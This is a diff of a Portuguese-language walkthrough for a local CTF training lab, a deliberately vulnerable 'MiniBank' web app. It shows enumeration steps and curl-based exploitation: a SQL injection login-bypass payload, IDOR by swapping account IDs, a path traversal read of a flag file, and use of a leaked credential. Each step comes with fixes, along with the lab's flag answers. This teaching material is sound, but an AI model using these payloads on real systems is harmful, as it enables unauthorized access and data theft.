@@ -1,15 +1,17 @@
 # Walkthrough - web-basic-01
 
-Este walkthrough ensina como validar o lab **web-basic-01**, baseado na aplicacao **MiniBank Internal Portal**.
+Este walkthrough ensina o fluxo esperado para resolver o lab **web-basic-01**, baseado na aplicacao **MiniBank Internal Portal**.
 
-O foco desta fase sao quatro vulnerabilidades principais com flag:
+O objetivo didatico e fazer o aluno descobrir rotas sensiveis por enumeracao logica, seguindo pistas visiveis na aplicacao, no codigo-fonte HTML e no `robots.txt`.
+
+As quatro vulnerabilidades principais sao:
 
 - SQL Injection no login
 - IDOR em contas
 - credencial vazada em arquivo publico
 - Path Traversal / LFI controlado
 
-`robots.txt`, `/health`, comentario HTML, `/admin` e `/backup` existem como pistas de enumeracao e validacao de impacto, mas nao possuem flag propria.
+`robots.txt`, `/status`, comentario HTML, `/backup` e `/download` funcionam como pistas de enumeracao e validacao de impacto.
 
 ## 1. Preparacao do ambiente
 
@@ -25,75 +27,108 @@ Suba os containers:
 sudo docker compose up --build
 ```
 
-O esperado e o Compose iniciar:
+O esperado e iniciar:
 
-- a aplicacao web na porta `8080`
-- o MySQL na rede interna do Docker, sem expor `3306` no host
+- aplicacao web em `http://localhost:8080`
+- MySQL apenas na rede interna do Docker Compose
+- somente a porta `8080` exposta no host
 
-Valide a pagina inicial:
+Valide a home:
 
 ```bash
 curl -i http://localhost:8080
 ```
 
-Voce deve receber HTTP `200 OK` e HTML contendo **MiniBank Internal Portal**.
-
-Valide tambem o healthcheck:
-
-```bash
-curl -i http://localhost:8080/health
-```
-
-O retorno esperado e JSON com informacoes verbosas, como nome da aplicacao, versao, ambiente, path interno e banco interno. Ele e uma pista de enumeracao, nao uma flag.
+Voce deve receber HTTP `200 OK` e HTML com **MiniBank Internal Portal**.
 
 ## 2. Enumeracao inicial
 
-Comece observando sem autenticacao. O objetivo e entender o que a aplicacao revela antes de testar payloads.
+Antes de explorar, observe. A primeira habilidade a treinar e encontrar pistas sem chute.
 
 ```bash
 curl -i http://localhost:8080
 curl -s http://localhost:8080 | head
-curl -s http://localhost:8080 | grep -i "admin\|robots\|backup\|dev"
+curl -s http://localhost:8080 | grep -i "admin\|robots\|backup\|dev\|status"
 ```
 
-Observe:
+O que observar:
 
-- titulo da aplicacao: `MiniBank Internal Portal`
-- link visivel para `/login`
-- link visivel para `/health`
-- tema de portal interno antigo
-- possiveis comentarios HTML
+- nome da aplicacao
+- link para `/login`
+- link para `/status`
+- linguagem de portal interno legado
+- pistas no codigo-fonte HTML
 
-Tecnologias aparentes:
-
-- HTTP/HTML renderizado no servidor
-- Express/Node.js
-- sessao via cookie apos login
-- MySQL indicado pelo healthcheck
-
-Teste uma rota inexistente:
+Teste uma rota inexistente para entender o padrao de erro:
 
 ```bash
 curl -i http://localhost:8080/nao-existe
 ```
 
-O comportamento de erro ajuda a identificar padrao de respostas e confirmar que a aplicacao trata rotas no backend.
+## 3. Comentario HTML
 
-## 3. Healthcheck verboso
+Visualize o codigo-fonte e procure comentarios:
+
+```bash
+curl -s http://localhost:8080 | grep -i "<!--"
+```
+
+Comentario esperado:
+
+```html
+<!-- revisar robots.txt antes de publicar o portal legado -->
+```
+
+Raciocinio: comentario HTML nao e controle de acesso, mas pode revelar processo interno, pendencias de publicacao e onde procurar proximas pistas.
+
+Impacto: um atacante ou auditor pode usar esse tipo de comentario para guiar enumeracao.
+
+Correcao: remover comentarios operacionais do HTML entregue ao cliente.
+
+## 4. robots.txt
+
+O comentario sugere verificar `robots.txt`.
+
+```bash
+curl -i http://localhost:8080/robots.txt
+```
+
+Conteudo esperado:
+
+```text
+User-agent: *
+Disallow: /admin
+Disallow: /backup
+Disallow: /dev.txt
+Disallow: /download
+Disallow: /status
+```
+
+Raciocinio: `robots.txt` costuma listar rotas que nao deveriam ser indexadas. Isso nao protege nada, mas orienta a enumeracao.
+
+Rotas descobertas:
+
+- `/status`
+- `/dev.txt`
+- `/backup`
+- `/download`
+- `/admin`
+
+## 5. Status verboso
+
+Acesse a rota descoberta:
+
+```bash
+curl -i http://localhost:8080/status
+```
 
 Com `jq`, se disponivel:
 
 ```bash
-curl -s http://localhost:8080/health | jq
+curl -s http://localhost:8080/status | jq
 ```
 
-Sem `jq`:
-
-```bash
-curl -i http://localhost:8080/health
-```
-
-O healthcheck atual revela:
+O retorno revela informacoes como:
 
 ```json
 {
@@ -106,121 +141,55 @@ O healthcheck atual revela:
 }
 ```
 
-Por que isso e suspeito:
+Impacto: ajuda fingerprinting, confirma ambiente de desenvolvimento, mostra path interno e indica MySQL na rede interna.
 
-- vaza ambiente (`development`)
-- vaza versao (`1.4.2-dev`)
-- vaza path interno (`/usr/src/app`)
-- vaza host e servico de banco (`minibank-db:3306`)
-
-Impacto: ajuda fingerprinting e mapeamento da arquitetura.
-
-Correcao: healthchecks publicos devem retornar apenas status minimo, como `{"status":"ok"}`. Diagnosticos detalhados devem ser internos, autenticados ou restritos por rede.
-
-## 4. robots.txt
-
-Acesse:
-
-```bash
-curl -i http://localhost:8080/robots.txt
-```
-
-Conteudo real:
-
-```text
-User-agent: *
-Disallow: /admin
-Disallow: /backup
-Disallow: /dev-notes.txt
-Disallow: /download
-```
-
-Por que e util em pentest web:
-
-- lista caminhos que a equipe nao quer indexar
-- pode revelar endpoints legados
-- pode indicar arquivos esquecidos
-- orienta a proxima etapa de enumeracao
-
-Importante: `robots.txt` nao e controle de acesso. Ele apenas orienta crawlers.
-
-## 5. Comentarios HTML suspeitos
-
-Procure comentarios:
-
-```bash
-curl -s http://localhost:8080 | grep -i "<!--"
-```
-
-Comentario real:
-
-```html
-<!-- legacy admin panel moved to /admin, check robots.txt before release -->
-```
-
-O que observar:
-
-- menciona painel admin legado
-- confirma `/admin`
-- manda verificar `robots.txt`
-
-Impacto: comentarios HTML podem revelar rotas antigas, TODOs, paineis internos, arquivos esquecidos e detalhes de ambiente.
-
-Correcao: nao enviar comentarios operacionais no HTML publico. Informacoes internas devem ficar em documentacao interna ou no repositorio, nao na resposta ao cliente.
+Correcao: endpoints publicos de status devem retornar apenas informacao minima, como `{"status":"ok"}`. Diagnosticos detalhados devem ficar restritos.
 
 ## 6. Credencial vazada em arquivo publico
 
-O `robots.txt` aponta para `/dev-notes.txt`. Acesse:
+O `robots.txt` revelou `/dev.txt`. Acesse:
 
 ```bash
-curl -i http://localhost:8080/dev-notes.txt
+curl -i http://localhost:8080/dev.txt
 ```
 
-O arquivo publico contem:
+O arquivo contem a credencial:
 
 ```text
 backup_user:backup123
-endpoint antigo: /backup
-FLAG{credencial_exposta_capturada}
 ```
 
-Flag:
+E a flag da vulnerabilidade de credencial exposta:
 
 ```text
 FLAG{credencial_exposta_capturada}
 ```
 
-Como validar impacto:
+Valide o impacto usando a credencial em `/backup`:
 
 ```bash
 curl -i http://localhost:8080/backup
 curl -i -u backup_user:backup123 http://localhost:8080/backup
 ```
 
-Sem credencial, `/backup` deve responder `401`. Com `backup_user:backup123`, deve responder `200 OK` e listar relatorios antigos. A rota `/backup` valida o impacto da credencial vazada, mas nao possui flag propria nesta fase.
+Sem credencial, o esperado e HTTP `401`. Com `backup_user:backup123`, o esperado e HTTP `200 OK` com listagem de relatorios.
 
 Impacto:
 
-- arquivo estatico publico exposto
-- credencial reutilizavel
-- acesso a area legada
+- arquivo estatico publico vazou credencial
+- credencial permite acesso a area legada
+- notas de desenvolvimento viraram superficie de ataque
 
 Correcao:
 
-- remover arquivos sensiveis de `public`
+- remover arquivos sensiveis de `app/public`
 - rotacionar credenciais expostas
 - usar variaveis de ambiente ou secret manager
-- revisar pipeline para impedir publicacao de notas internas
+- revisar publicacao de artefatos estaticos
 
 ## 7. SQL Injection no login
 
-Rota real:
-
-```text
-POST /login
-```
-
-Valide primeiro um login legitimo:
+A rota de login usa MySQL. Primeiro valide comportamento normal:
 
 ```bash
 curl -i -c joao.cookies \
@@ -228,13 +197,13 @@ curl -i -c joao.cookies \
   http://localhost:8080/login
 ```
 
-Depois confirme o dashboard:
+Confirme o dashboard:
 
 ```bash
 curl -s -b joao.cookies http://localhost:8080/dashboard | grep -i "joao\|employee\|contas"
 ```
 
-Agora valide um login incorreto:
+Agora valide falha de login:
 
 ```bash
 curl -i \
@@ -242,36 +211,25 @@ curl -i \
   http://localhost:8080/login
 ```
 
-O esperado e `401`.
-
-O codigo vulneravel concatena entrada do usuario na query:
-
-```js
-const sql = "SELECT id, username, role FROM users WHERE username = '" + username + "' AND password = '" + password + "' LIMIT 1";
-```
+O ponto vulneravel e a concatenacao direta de `username` e `password` na query SQL.
 
 Payload funcional:
 
 ```text
-username: admin' #
+username: admin' OR '1'='1' -- 
 password: qualquercoisa
 ```
 
-Exemplo com `curl`:
+Inclua o espaco apos `--`; no MySQL ele faz parte do comentario SQL.
+
+Com `curl`:
 
 ```bash
 curl -i -c admin.cookies \
-  --data-urlencode "username=admin' #" \
+  --data-urlencode "username=admin' OR '1'='1' -- " \
   --data-urlencode "password=qualquercoisa" \
   http://localhost:8080/login
 ```
-
-Por que funciona:
-
-- `admin'` fecha a string de usuario como `admin`
-- `#` inicia comentario no MySQL
-- a verificacao de senha fica comentada
-- a aplicacao cria sessao para o usuario `admin`
 
 Valide a flag no dashboard:
 
@@ -285,25 +243,19 @@ Flag:
 FLAG{sqli_capturada}
 ```
 
-Impacto: bypass de autenticacao e acesso como admin sem conhecer a senha.
+Impacto: bypass de autenticacao e acesso como usuario administrativo sem conhecer a senha.
 
 Correcao:
 
 - prepared statements
 - queries parametrizadas
-- hash forte para senhas
+- hash forte de senha
 - validacao de entrada
-- tratamento uniforme para erros de login
+- respostas de erro uniformes
 
 ## 8. IDOR em contas
 
-Rota real:
-
-```text
-GET /account/:id
-```
-
-A aplicacao exige login, mas nao valida se a conta acessada pertence ao usuario logado.
+IDOR ocorre quando a aplicacao usa um ID direto na URL e nao valida se o usuario logado pode acessar aquele recurso.
 
 Faca login como Joao:
 
@@ -313,21 +265,13 @@ curl -i -c joao.cookies \
   http://localhost:8080/login
 ```
 
-Contas reais no banco:
-
-- `/account/1` - Joao Silva
-- `/account/2` - Maria Oliveira
-- `/account/3` - Carlos Backup
-- `/account/4` - Admin User
-- `/account/5` - Joao Silva - Reserva
-
 Acesse uma conta do Joao:
 
 ```bash
 curl -s -b joao.cookies http://localhost:8080/account/1 | grep -i "Joao\|Conta\|Nota"
 ```
 
-Troque apenas o ID:
+Troque apenas o ID para a conta de Maria:
 
 ```bash
 curl -s -b joao.cookies http://localhost:8080/account/2 | grep -i "Maria\|FLAG\|Nota"
@@ -339,51 +283,29 @@ Flag:
 FLAG{idor_capturada}
 ```
 
-Por que funciona: a query busca `accounts WHERE id = ?`, mas nao filtra por `user_id` do usuario autenticado.
+Raciocinio: a aplicacao exige autenticacao, mas nao valida autorizacao sobre o recurso. Login e permissao de acesso nao sao a mesma coisa.
 
 Impacto:
 
-- acesso indevido a contas de outros usuarios
+- acesso a dados de outro cliente/usuario
 - vazamento de saldo, numero de conta e notas internas
 - quebra de autorizacao horizontal
 
 Correcao:
 
-- verificar o dono do recurso no backend
+- validar dono do recurso no backend
 - filtrar por `id` e `user_id`
-- criar regras explicitas para perfis administrativos
-- adicionar testes de acesso cruzado entre usuarios
+- testar acesso cruzado entre usuarios
 
 ## 9. Path Traversal / LFI controlado
 
-Rota real:
-
-```text
-GET /download?file=
-```
-
-Teste primeiro um arquivo permitido:
+O `robots.txt` revelou `/download`. Teste primeiro um arquivo esperado:
 
 ```bash
 curl -i "http://localhost:8080/download?file=public-info.txt"
 ```
 
-Tambem existem:
-
-```bash
-curl -i "http://localhost:8080/download?file=report-q1.txt"
-curl -i "http://localhost:8080/download?file=report-q2.txt"
-```
-
-O problema e que a aplicacao monta o caminho com o parametro `file` sem garantir que o resultado permanece em `/usr/src/app/files`.
-
-Dentro do container, a base e:
-
-```text
-/usr/src/app/files
-```
-
-Para chegar em `/flags/final.txt`, suba quatro niveis:
+Depois teste o traversal controlado:
 
 ```bash
 curl -i "http://localhost:8080/download?file=../../../../flags/final.txt"
@@ -395,25 +317,50 @@ Flag:
 FLAG{path_traversal_capturada}
 ```
 
+Raciocinio: o endpoint aceita um nome de arquivo e monta um caminho no servidor sem garantir que o caminho final continua dentro da pasta permitida.
+
 Impacto:
 
 - leitura de arquivo fora do diretorio esperado
 - vazamento de segredos
-- exposicao de configuracoes ou codigo dentro do container
+- exposicao de configuracoes internas no container
 
 Correcao:
 
 - usar allowlist de arquivos
-- normalizar e resolver caminho absoluto
+- normalizar caminho
 - bloquear `../`
-- garantir que o caminho final continue dentro do diretorio permitido
-- evitar aceitar paths arbitrarios do usuario
+- garantir que o caminho final permanece dentro do diretorio permitido
 
-## 10. Validacao rapida do release candidate
+## 10. Fluxo esperado do aluno
 
-Antes de entregar o lab para uma turma, valide se apenas as quatro flags finais aparecem no projeto. O comando completo de `grep` esta documentado em `../VALIDATION.md`.
+1. Acessar a home
+2. Visualizar o codigo-fonte
+3. Encontrar comentario HTML sugerindo `robots.txt`
+4. Acessar `/robots.txt`
+5. Descobrir `/status`, `/dev.txt`, `/backup` e `/download`
+6. Acessar `/dev.txt` e encontrar credencial exposta
+7. Usar credencial no `/backup`
+8. Explorar login com SQL Injection
+9. Acessar contas e explorar IDOR
+10. Explorar `/download?file=` com path traversal
 
-O resultado esperado e:
+## 11. Validacao rapida
+
+Com a aplicacao em execucao:
+
+```bash
+curl -i http://localhost:8080
+curl -i http://localhost:8080/status
+curl -i http://localhost:8080/robots.txt
+curl -i http://localhost:8080/dev.txt
+curl -i "http://localhost:8080/download?file=public-info.txt"
+curl -i "http://localhost:8080/download?file=../../../../flags/final.txt"
+```
+
+Valide as flags no repositorio usando o comando documentado em `../VALIDATION.md`.
+
+Resultado esperado:
 
 ```text
 FLAG{credencial_exposta_capturada}
@@ -421,91 +368,3 @@ FLAG{idor_capturada}
 FLAG{path_traversal_capturada}
 FLAG{sqli_capturada}
 ```
-
-Com a aplicacao em execucao, valide as pistas e o downloader:
-
-Suba a aplicacao:
-
-```bash
-cd ~/ctf-labs/web-basic-01
-sudo docker compose up --build
-```
-
-```bash
-curl -i http://localhost:8080
-curl -i http://localhost:8080/health
-curl -i http://localhost:8080/robots.txt
-curl -i http://localhost:8080/dev-notes.txt
-curl -i "http://localhost:8080/download?file=public-info.txt"
-curl -i "http://localhost:8080/download?file=../../../../flags/final.txt"
-```
-
-## 11. Lista final de flags
-
-As quatro flags reais do `web-basic-01` sao:
-
-- `FLAG{sqli_capturada}`
-- `FLAG{idor_capturada}`
-- `FLAG{credencial_exposta_capturada}`
-- `FLAG{path_traversal_capturada}`
-
-Nao ha flag propria em `/admin`, `/backup`, `/health`, `robots.txt` ou comentario HTML.
-
-## 12. Checklist de validacao manual
-
-- [ ] `sudo docker compose up --build` sobe sem erro dentro de `web-basic-01`
-- [ ] `http://localhost:8080` responde
-- [ ] `/health` responde e serve como pista
-- [ ] `/robots.txt` existe e lista rotas suspeitas
-- [ ] comentario HTML aparece no fonte
-- [ ] `/dev-notes.txt` existe e contem credencial vazada
-- [ ] `FLAG{credencial_exposta_capturada}` aparece em `/dev-notes.txt`
-- [ ] credencial `backup_user:backup123` acessa `/backup`
-- [ ] SQL Injection permite login como admin
-- [ ] dashboard admin mostra `FLAG{sqli_capturada}`
-- [ ] IDOR permite acessar `/account/2` como Joao
-- [ ] `/account/2` mostra `FLAG{idor_capturada}`
-- [ ] `/download?file=../../../../flags/final.txt` mostra `FLAG{path_traversal_capturada}`
-- [ ] somente as quatro flags oficiais foram coletadas
-
-## 13. Como corrigir cada vulnerabilidade
-
-SQL Injection:
-
-- trocar concatenacao de SQL por prepared statements
-- usar queries parametrizadas
-- armazenar senhas com hash forte
-- validar entrada e padronizar respostas de erro
-
-IDOR:
-
-- verificar autorizacao por recurso
-- garantir que `account.user_id` bate com o usuario logado
-- nao confiar no ID da URL como prova de permissao
-- testar acessos cruzados
-
-Credencial vazada:
-
-- remover arquivos sensiveis de `app/public`
-- rotacionar credenciais expostas
-- usar variaveis de ambiente ou secret manager
-- bloquear publicacao de notas internas
-
-Path Traversal:
-
-- usar allowlist de arquivos
-- normalizar paths
-- bloquear `../`
-- validar que o caminho final continua dentro da pasta permitida
-
-Healthcheck verboso:
-
-- retornar somente status minimo
-- remover path interno, versao detalhada e dados de banco
-- separar healthcheck externo de diagnostico interno
-
-Comentarios HTML e `robots.txt`:
-
-- remover comentarios operacionais do HTML publico
-- nao tratar `robots.txt` como controle de acesso
-- proteger rotas sensiveis no backend
